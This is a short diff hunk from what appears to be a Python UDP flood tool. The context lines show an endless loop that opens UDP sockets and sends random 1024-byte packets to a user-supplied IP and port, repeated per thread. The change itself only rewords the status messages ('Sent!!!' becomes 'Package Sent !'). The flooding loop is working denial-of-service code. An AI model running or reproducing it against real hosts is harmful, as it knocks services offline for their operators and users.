@@ -12,16 +12,16 @@ times = int(input(" [+] Packets Per One Connection : "))
 threads = int(input(" [+] Threads : "))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice((" [*]"," [!]"," [#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Package Sent !")
 		except:
-			print(i +" Sent!!!")
+			print(i +" Package Sent !")
 
 def run2():
 	data = random._urandom(16)
